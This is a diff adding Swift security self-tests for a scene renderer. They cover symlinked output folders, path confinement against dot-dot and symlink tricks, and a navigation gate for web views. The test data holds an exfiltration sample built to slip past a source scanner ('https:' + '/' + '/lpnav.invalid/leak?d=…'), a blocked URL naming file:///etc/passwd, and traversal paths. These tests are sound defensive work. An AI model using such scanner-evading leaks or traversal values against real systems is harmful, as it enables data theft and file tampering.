@@ -26,7 +26,11 @@ extension SelfTests {
             TestCase(name: "runtime.check.startFailureCollapses", run: RuntimeTests.checkStartFailure),
             TestCase(name: "runtime.check.writesReportAndPerformance", run: RuntimeTests.checkWritesFiles),
             TestCase(name: "runtime.check.compileFailureSkipsRendering", run: RuntimeTests.checkCompileFailure),
+            TestCase(name: "runtime.check.symlinkedCheckDirectory", run: RuntimeTests.checkSymlinkedCheckDirectory),
+            TestCase(name: "runtime.render.outputConfinement", run: RuntimeTests.renderOutputConfinement),
+            TestCase(name: "runtime.render.navigationGate", run: RuntimeTests.navigationGate),
             TestCase(name: "runtime.client.roundTripAndErrors", run: RuntimeTests.clientRoundTrip),
+            TestCase(name: "runtime.client.spoolFallback", run: RuntimeTests.clientSpoolFallback),
             TestCase(name: "runtime.client.waitsForServerHoldingLock", run: RuntimeTests.clientWaitsForLockHolder),
             TestCase(name: "runtime.e2e.templateCheck", run: RuntimeTests.endToEnd),
         ]
@@ -343,6 +347,178 @@ enum RuntimeTests {
         try expectEqual(try SceneManifest.load(package: pkg).performance?.benchMs, 2.5)
     }
 
+    /// A package whose .check is a symlink (planted by an agent, or shipped in a downloaded package)
+    /// must not make the checker delete or overwrite files wherever the link points.
+    static func checkSymlinkedCheckDirectory() throws {
+        let fm = FileManager.default
+        let pkg = try package("linked", js: minimalScene)
+        let victim = try tempDir("victim")
+        defer { try? fm.removeItem(at: victim); try? fm.removeItem(at: pkg.deletingLastPathComponent()) }
+        for (name, text) in [("photo.png", "my photo"), ("report.json", "my report"), ("scene.html", "my page"), ("keep.txt", "keep")] {
+            try Data(text.utf8).write(to: victim.appendingPathComponent(name))
+        }
+        try fm.createSymbolicLink(at: pkg.appendingPathComponent(".check"), withDestinationURL: victim)
+        let fake = FakeRender()
+        let report = try blocking { try await SceneChecker(compiler: SceneCompiler(), render: fake).check(package: pkg, options: CheckOptions(quick: true)) }
+        try expect(report.passed, "\(report.problems)")
+        for (name, text) in [("photo.png", "my photo"), ("report.json", "my report"), ("scene.html", "my page"), ("keep.txt", "keep")] {
+            try expectEqual((try? String(contentsOf: victim.appendingPathComponent(name), encoding: .utf8)) ?? "(deleted)", text)
+        }
+        try expectEqual(try fm.contentsOfDirectory(atPath: victim.path).sorted(), ["keep.txt", "photo.png", "report.json", "scene.html"])
+        // The link was replaced by a real directory that holds this check's output.
+        let check = pkg.appendingPathComponent(".check")
+        try expectEqual((try fm.attributesOfItem(atPath: check.path))[.type] as? FileAttributeType, .typeDirectory)
+        try expect(fm.fileExists(atPath: check.appendingPathComponent("report.json").path), "report written into the real .check")
+        try expect(fake.requests.allSatisfy { ($0.out ?? check.path).hasPrefix(check.path + "/") || $0.out == nil }, "stills go to the real .check")
+
+        // A .check that holds a symlink named like our output: the link goes, its target stays.
+        let target = victim.appendingPathComponent("photo.png")
+        try fm.createSymbolicLink(at: check.appendingPathComponent("1512x982@2-t4.png"), withDestinationURL: target)
+        _ = try blocking { try await SceneChecker(compiler: SceneCompiler(), render: fake).check(package: pkg, options: CheckOptions(quick: true)) }
+        try expectEqual((try? String(contentsOf: target, encoding: .utf8)) ?? "(deleted)", "my photo")
+    }
+
+    /// The render server runs outside any agent sandbox, so the `out` a client names must stay in
+    /// the request's own .check (or scene package, for thumbnails), LivePaper's AI workspaces or a
+    /// temporary directory — with symlinks resolved at the moment of writing.
+    static func renderOutputConfinement() throws {
+        let fm = FileManager.default
+        let root = try tempDir("outputs").resolvingSymlinksInPath()
+        defer { try? fm.removeItem(at: root) }
+        let support = root.appendingPathComponent("support"), scratch = root.appendingPathComponent("tmp")
+        let home = root.appendingPathComponent("home")
+        for d in [support.appendingPathComponent("Workspaces/s1/scene/.check"), scratch, home] {
+            try fm.createDirectory(at: d, withIntermediateDirectories: true)
+        }
+        let policy = RenderOutputPolicy(supportRoot: support, temporaryDirectories: [scratch])
+        let pkg = try package("out", js: minimalScene)
+        let check = pkg.appendingPathComponent(".check")
+        try fm.createDirectory(at: check, withIntermediateDirectories: true)
+        let html = check.appendingPathComponent("scene.html")
+        try Data("<html></html>".utf8).write(to: html)
+        let png = Data([0x89, 0x50, 0x4E, 0x47, 1, 2, 3])
+        func still(_ out: URL) -> RenderRequest { RenderRequest(op: .still, html: html.path, out: out.path) }
+        func refused(_ r: RenderRequest, _ why: String) throws {
+            do { _ = try policy.write(png, for: r); throw TestFailure(description: "expected a refusal: \(why) (\(r.out ?? "-"))") }
+            catch is RenderOutputError {}
+        }
+
+        // Allowed: the html's .check, the AI workspaces (missing folders are created), the temp dir.
+        try expectEqual(try Data(contentsOf: try policy.write(png, for: still(check.appendingPathComponent("a.png")))), png)
+        let ws = support.appendingPathComponent("Workspaces/s1/scene/.check/new/b.png")
+        _ = try policy.write(png, for: still(ws))
+        try expectEqual(try Data(contentsOf: ws), png)
+        _ = try policy.write(png, for: still(scratch.appendingPathComponent("c.png")))
+        try expectEqual(try Data(contentsOf: check.appendingPathComponent("a.png")), png)
+
+        // Refused: anywhere else, other file types, through a symlinked folder, over a non-file.
+        let thesis = home.appendingPathComponent("thesis.png")
+        try Data("my thesis".utf8).write(to: thesis)
+        try refused(still(thesis), "outside every allowed root")
+        try refused(still(check.appendingPathComponent("notes.docx")), "not a PNG")
+        try refused(still(URL(fileURLWithPath: "relative.png")), "relative")
+        try refused(still(check.appendingPathComponent("../../../home/thesis.png")), "dot-dot")
+        let linked = support.appendingPathComponent("Workspaces/s1/scene/.check/linked")
+        try fm.createSymbolicLink(at: linked, withDestinationURL: home)
+        try refused(still(linked.appendingPathComponent("thesis.png")), "symlinked folder")
+        try fm.createSymbolicLink(at: check.appendingPathComponent("link.png"), withDestinationURL: thesis)
+        try refused(still(check.appendingPathComponent("link.png")), "destination is a symlink")
+        try fm.createDirectory(at: check.appendingPathComponent("dir.png"), withIntermediateDirectories: true)
+        try refused(still(check.appendingPathComponent("dir.png")), "destination is a directory")
+        // An html outside any .check doesn't make its folder writable.
+        let looseHTML = home.appendingPathComponent("page.html")
+        try Data().write(to: looseHTML)
+        try refused(RenderRequest(op: .still, html: looseHTML.path, out: home.appendingPathComponent("x.png").path), "html's folder isn't a .check")
+        try expectEqual(try String(contentsOf: thesis, encoding: .utf8), "my thesis")
+        try expectEqual(try fm.contentsOfDirectory(atPath: home.path).sorted(), ["page.html", "thesis.png"])
+
+        // Thumbnails: into the scene package they render (JPEG only).
+        let thumb = RenderRequest(op: .thumbnail, scene: pkg.path, out: pkg.appendingPathComponent("thumbnail.jpg").path)
+        _ = try policy.write(png, for: thumb)
+        try refused(RenderRequest(op: .thumbnail, scene: pkg.path, out: pkg.appendingPathComponent("thumbnail.png").path), "not a JPEG")
+        try refused(RenderRequest(op: .thumbnail, scene: home.path, out: home.appendingPathComponent("thumbnail.jpg").path), "not a scene package")
+        try refused(RenderRequest(op: .thumbnail, scene: pkg.path, out: home.appendingPathComponent("thumbnail.jpg").path), "outside the package")
+        // Requests that write nothing need no out.
+        try refused(RenderRequest(op: .bench, html: html.path, out: check.appendingPathComponent("z.png").path), "bench writes nothing")
+    }
+
+    /// Scene web views allow exactly the load their host started; a scene navigating anywhere
+    /// (`location = 'ht' + 'tps://…'` gets past the source scanner) is cancelled.
+    static func navigationGate() throws {
+        typealias R = SceneNavigationGate.Request
+        let base = URL(string: "livepaper-render://scene/")!
+        var render = SceneNavigationGate()
+        try expect(!render.decide(R(url: base, isMainFrame: true)), "nothing is allowed before the host loads")
+        render.expect(base)
+        try expect(!render.decide(R(url: URL(string: "https://lpnav.invalid/leak?d=secret"), isMainFrame: true)), "remote")
+        try expect(!render.decide(R(url: base, isMainFrame: false)), "subframe")
+        try expect(!render.decide(R(url: base, isMainFrame: true, opensNewWindow: true)), "new window")
+        try expect(!render.decide(R(url: base, isMainFrame: true, kind: .linkActivated)), "link")
+        try expect(!render.decide(R(url: base, isMainFrame: true, isDownload: true)), "download")
+        try expect(render.decide(R(url: base, isMainFrame: true)), "the host's own load")
+        try expect(!render.decide(R(url: base, isMainFrame: true)), "only once: a scene reloading itself is cancelled")
+        try expect(!render.decide(R(url: URL(string: "livepaper-render://scene/#t=3"), isMainFrame: true)), "in-page navigation")
+        render.expect(base)
+        try expect(render.decide(R(url: URL(string: "livepaper-render://scene/")!, isMainFrame: true)), "re-armed by the next host load")
+
+        var saver = SceneNavigationGate()
+        saver.expect(URL(string: "about:blank")!)
+        for blocked in ["data:text/html,<p>x", "blob:null/1234", "about:srcdoc", "file:///etc/passwd", "http://127.0.0.1/"] {
+            try expect(!saver.decide(R(url: URL(string: blocked), isMainFrame: true)), blocked)
+        }
+        try expect(saver.decide(R(url: URL(string: "about:blank"), isMainFrame: true)), "saver's loadHTMLString(baseURL: nil)")
+
+        var preview = SceneNavigationGate()
+        let file = URL(fileURLWithPath: "/tmp/LivePaperPreviews/aurora-1.html")
+        preview.expect(file)
+        try expect(!preview.decide(R(url: URL(fileURLWithPath: "/tmp/LivePaperPreviews/other.html"), isMainFrame: true)), "other file")
+        try expect(preview.decide(R(url: file, isMainFrame: true)), "the preview's own file")
+        try expectEqual(SceneNavigationGate.describe(URL(string: "https://user:pw@lpnav.invalid/leak?d=secret#x")), "https://lpnav.invalid/leak")
+    }
+
+    /// In an AI session whose sandbox blocks the socket, the client leaves the request in the
+    /// session's spool for the runner to relay — and never starts a render daemon itself.
+    static func clientSpoolFallback() throws {
+        let fm = FileManager.default
+        let spool = try tempDir("spool")
+        defer { try? fm.removeItem(at: spool) }
+        let socket = URL(fileURLWithPath: "/tmp/lp-nosock-\(UUID().uuidString.prefix(8)).sock")
+        let client = RenderClient(socket: socket, spool: spool)
+        try expect(!client.allowSpawn, "never spawns a daemon from inside a session")
+        // A stand-in for RenderRelay: claim, answer.
+        let stop = Flag()
+        Thread {
+            while !stop.isSet {
+                for name in (try? fm.contentsOfDirectory(atPath: spool.path)) ?? [] where name.hasSuffix(".request.json") {
+                    let id = String(name.dropLast(".request.json".count))
+                    let claimed = spool.appendingPathComponent(id + ".working")
+                    guard rename(spool.appendingPathComponent(name).path, claimed.path) == 0,
+                          let req = try? JSONDecoder().decode(RenderRequest.self, from: Data(contentsOf: claimed)) else { continue }
+                    let resp = RenderResponse(ok: true, ready: true, note: "relayed \(req.op.rawValue) t=\(Int(req.t ?? -1))")
+                    try? JSONEncoder().encode(resp).write(to: spool.appendingPathComponent(id + ".response.json"), options: .atomic)
+                }
+                usleep(20_000)
+            }
+        }.start()
+        let r = try client.sendBlocking(RenderRequest(op: .still, html: "/x/.check/scene.html", t: 7), timeout: 10)
+        stop.set()
+        try expectEqual(r.note, "relayed still t=7")
+        try expectEqual(try fm.contentsOfDirectory(atPath: spool.path), [])   // the client cleans up
+        // Nobody relays: a clear error after the claim timeout, not a hang until the request timeout.
+        let lonely = RenderClient(socket: socket, spool: spool)
+        lonely.spoolClaimTimeout = 0.5
+        let began = Date()
+        do { _ = try lonely.sendBlocking(RenderRequest(op: .bench, html: "/x/.check/scene.html"), timeout: 30); throw TestFailure(description: "expected an error") }
+        catch let e as RenderClientError { try expect("\(e.localizedDescription)".contains("didn't pick up"), e.localizedDescription) }
+        try expect(Date().timeIntervalSince(began) < 5, "gave up promptly")
+        try expectEqual(try fm.contentsOfDirectory(atPath: spool.path), [])
+    }
+    final class Flag: @unchecked Sendable {
+        private let lock = NSLock(); private var value = false
+        var isSet: Bool { lock.lock(); defer { lock.unlock() }; return value }
+        func set() { lock.lock(); value = true; lock.unlock() }
+    }
+
     static func checkCompileFailure() throws {
         let pkg = try package("broken", js: "fetch('x');\n" + minimalScene)
         let fake = FakeRender()
@@ -470,5 +646,48 @@ enum RuntimeTests {
         try expect(t.ok, t.note ?? "thumbnail failed")
         let jpeg = try Data(contentsOf: thumb)
         try expect(jpeg.starts(with: [0xFF, 0xD8]), "JPEG")
+
+        // The server refuses to write outside the request's package / workspaces / temp folders.
+        // (Failures are collected so one run reports every one of them.)
+        var failures: [String] = []
+        func check(_ ok: Bool, _ message: @autoclosure () -> String) { if !ok { failures.append(message()) } }
+        let fm = FileManager.default
+        let outside = fm.homeDirectoryForCurrentUser.appendingPathComponent("Library/Caches/LivePaperSelfTest-\(UUID().uuidString.prefix(8))")
+        try fm.createDirectory(at: outside, withIntermediateDirectories: true)
+        defer { try? fm.removeItem(at: outside) }
+        let victim = outside.appendingPathComponent("victim.png")
+        try Data("not an image".utf8).write(to: victim)
+        let html = pkg.appendingPathComponent(".check/scene.html").path
+        for (request, what) in [(RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1, out: victim.path), "still outside"),
+                                (RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1,
+                                               out: pkg.appendingPathComponent(".check/notes.docx").path), "not a PNG"),
+                                (RenderRequest(op: .thumbnail, scene: pkg.path, out: outside.appendingPathComponent("thumbnail.jpg").path), "thumbnail outside")] {
+            let r = try client.sendBlocking(request, timeout: 60)
+            print("  \(what): ok=\(r.ok) note=\(r.note ?? "-")")
+            check(!r.ok && (r.note ?? "").contains("refusing to write"), "\(what): \(r.ok) \(r.note ?? "")")
+        }
+        check((try? String(contentsOf: victim, encoding: .utf8)) == "not an image", "victim overwritten")
+        check((try? fm.contentsOfDirectory(atPath: outside.path)) == ["victim.png"], "files written outside: \((try? fm.contentsOfDirectory(atPath: outside.path)) ?? [])")
+
+        // A scene that navigates away (a URL the source scanner can't see) is stopped, not loaded.
+        let nav = try package("navigates", js: """
+        LivePaper.scene({
+          setup(lp) { location.href = 'https:' + '/' + '/lpnav.invalid/leak?d=' + lp.w; },
+          draw(lp) { lp.ctx.fillStyle = '#102040'; lp.ctx.fillRect(0, 0, lp.w, lp.h); }
+        });
+        """)
+        defer { try? fm.removeItem(at: nav.deletingLastPathComponent()) }
+        let navHTML = nav.appendingPathComponent(".check/scene.html")
+        try SceneCompiler().compile(package: nav, to: navHTML)
+        let n = try client.sendBlocking(RenderRequest(op: .still, html: navHTML.path, width: 320, height: 200, dpr: 1, t: 1,
+                                                      out: nav.appendingPathComponent(".check/still.png").path), timeout: 60)
+        print("  navigating still: ok=\(n.ok) note=\(n.note ?? "-") errors=\(n.errors)")
+        let blocked = (n.note ?? "").contains("tried to navigate") || n.errors.contains { $0.contains("tried to navigate") }
+        check(blocked && !(n.note ?? "").contains("hostname"), "navigation: ok=\(n.ok) note=\(n.note ?? "-") errors=\(n.errors)")
+        let navCheck = try blocking { try await SceneChecker(render: client).check(package: nav, options: CheckOptions(quick: true)) }
+        print("  navigating check: passed=\(navCheck.passed) jsErrors=\(navCheck.jsErrors)")
+        check(!navCheck.passed && navCheck.jsErrors.contains { $0.contains("tried to navigate to https://lpnav.invalid/leak") },
+              "check fails a navigating scene: \(navCheck.problems)")
+        if !failures.isEmpty { throw TestFailure(description: failures.joined(separator: "\n    ")) }
     }
 }
